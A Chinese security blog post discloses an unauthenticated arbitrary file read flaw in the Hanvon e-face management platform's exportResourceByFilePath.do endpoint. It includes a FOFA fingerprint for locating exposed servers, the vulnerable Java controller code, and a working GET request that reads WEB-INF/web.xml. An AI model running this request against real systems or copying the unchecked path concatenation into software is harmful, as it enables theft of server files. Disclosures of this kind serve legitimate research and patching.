---
title: "汉王e脸通综合管理平台 exportResourceByFilePath.do 任意文件读取漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-leaveList-exportResourceByFilePath-fileread.html
asset_dir: assets/汉王e脸通综合管理平台-exportresourcebyfilepath.do-任意文件读取漏洞
---

# 汉王e脸通综合管理平台 exportResourceByFilePath.do 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/20 08:27
* 810浏览
* [0评论](#comment)
* 15分钟阅读

深入探索

软件

认证

信息安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台 exportResourceByFilePath.do 接口存在任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。攻击者可在无需认证的情况下，通过构造恶意请求访问 exportResourceByFilePath.do 接口，传入任意文件路径参数，实现服务器上任意文件的读取，影响系统敏感数据的泄露和信息安全。

漏洞预警服务

# 影响版本

v1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `LeaveListController` 下的 `exportResourceByFilePath.do` 实现方式

```
@ResponseBody
@RequestMapping(
    value = {"exportResourceByFilePath.do"},
    method = {RequestMethod.GET}
)
public void exportResourceByFilePath(@RequestParam(required = false,value = "filePath") String filePath, HttpServletResponse response) throws Exception {
    try {
        String path = TheApp.getRootPath("");
        String photoPath = path + filePath;
        File file = new File(photoPath);
        if (file.exists()) {
            InputStream inStream = new FileInputStream(photoPath);
            response.reset();
            response.setContentType("bin");
            response.addHeader("Content-Disposition", "attachment;filename=\"" + new String(filePath.getBytes("utf-8"), "ISO8859-1") + "\"");
            byte[] b = new byte[100];

            int len;
            while((len = inStream.read(b)) > 0) {
                response.getOutputStream().write(b, 0, len);
            }

            inStream.close();
        }
    } catch (IOException e) {
        e.printStackTrace();
    }

}
```

深入探索

网络安全培训

安全工具开发

企业安全咨询

对用户可控参数 `filePath` 无任何过滤或校验，直接拼接路径返回文件路径进行文件操作，也是朴实无华的任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。

# 漏洞复现

```
GET /manage/leaveList/exportResourceByFilePath.do?recoToken=67mds2pxXQb&filePath=WEB-INF/web.xml HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 exportResourceByFilePath.do 任意文件读取漏洞](images/img-001-05ae55a546e4.webp)](https://image.mrxn.net/2a8433a9dbc84c42b130766151fbf778.webp)

成功读取到 web.xml 文件

网络安全

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 exportResourceByFilePath.do 任意文件读取漏洞](https://mrxn.net/jswz/hanvon-efacego-leaveList-exportResourceByFilePath-fileread.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-leaveList-exportResourceByFilePath-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-leaveList-exportResourceByFilePath-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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